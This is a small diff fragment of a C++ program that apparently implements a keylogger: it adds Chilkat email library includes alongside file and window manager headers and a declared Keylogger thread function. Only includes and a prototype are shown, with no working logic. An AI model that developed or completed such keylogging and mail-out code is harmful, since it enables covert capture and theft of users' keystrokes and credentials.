@@ -4,6 +4,8 @@
 #include "filemanager.h"
 // #include "mailmanager.h"
 #include "winmanager.h"
+#include <CkMailMan.h>
+#include <CkEmail.h>
 using namespace std;
 
 DWORD WINAPI Keylogger(LPVOID lpParm);
